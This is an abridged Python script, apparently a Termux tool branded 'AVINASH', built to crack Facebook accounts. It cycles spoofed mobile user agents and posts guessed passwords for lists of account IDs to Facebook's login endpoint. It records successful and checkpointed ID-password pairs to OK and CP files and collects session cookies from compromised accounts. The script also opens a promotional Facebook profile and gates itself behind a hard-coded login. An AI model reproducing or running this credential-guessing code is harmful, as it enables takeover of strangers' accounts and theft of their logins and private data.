...
for x in range(10):
    ...
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {#os.system("pkg install espeak")
#-----------------[ AVINASH-King ]-------------------#
...
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY FB ACCOUNT")
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/profile.php?id=61551443378124')
#------------------[ AVINASH-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; LLD-AL20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36",]
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/AVINASH.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
while attemps < 12345677901:
    ...
    if username == 'AVINASH' and password == 'KOLADOKHAU':
...
logo =""" 
   ...
   ____     __    __    _____      __      _     ____      _____   __    __  
 \033 (    )    ) )  ( (   (_   _)    /  \    / )   (    )    / ____\ (  \  /  ) 
\034  / /\ \   ( (    ) )    | |     / /\ \  / /    / /\ \   ( (___    \ (__) /  
\035 ( (__) )   \ \  / /     | |     ) ) ) ) ) )   ( (__) )   \___ \    ) __ (   
\036  )    (     \ \/ /      | |    ( ( ( ( ( (     )    (        ) )  ( (  ) )  
\037 /  /\  \     \  /      _| |__  / /  \ \/ /    /  /\  \   ___/ /    ) )( (   
\038/__(  )__\     \/      /_____( (_/    \__/    /__(  )__\ /____/    /_/  \_\  
   ...
   ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
   \033[1;97m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
   ║    Author                   • \33[1;38mSM-AVINASH ]\33[1;38m    ║\033[1;31m 
   ║    Facebook                 • AVINASH BAU]  ║  \033[1;97m  
   ║    Github                   • \33[1;38mAVINASH-BAU ]  ║\33[1;34m   
...
os.system('espeak -a 300 " Welcome,   to,  AVINASH,BAU,  Tools"')
pass
...
def passwrd():
    ...
    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mJAY AVINASH VAN Speed Up KO LAAGI')
    print('\033[0;97m===============================================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}•[AVINASHM1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[AVINASH-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[AVINASH-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[AVINASH-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•AVINASH-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•AVINASH-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  AVINASH,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
